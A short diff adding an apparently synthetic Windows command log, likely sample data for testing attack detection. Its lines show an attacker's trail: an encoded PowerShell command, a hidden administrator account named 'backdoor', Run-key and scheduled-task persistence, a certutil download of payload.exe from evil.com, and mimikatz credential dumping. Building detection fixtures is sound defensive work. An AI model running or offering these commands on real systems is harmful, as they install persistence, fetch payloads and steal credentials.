@@ -1,0 +1,9 @@
+2024-01-15 08:23:11 powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==
+2024-01-15 08:24:03 net user backdoor P@ssw0rd123 /add
+2024-01-15 08:24:45 net localgroup administrators backdoor /add
+2024-01-15 08:25:12 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d malware.exe
+2024-01-15 08:26:33 certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
+2024-01-15 08:27:01 normal system log entry nothing suspicious here
+2024-01-15 08:28:44 sekurlsa::logonpasswords
+2024-01-15 08:29:10 mimikatz privilege::debug
+2024-01-15 08:30:22 schtasks /create /tn WindowsUpdate /tr malware.exe /sc onlogon
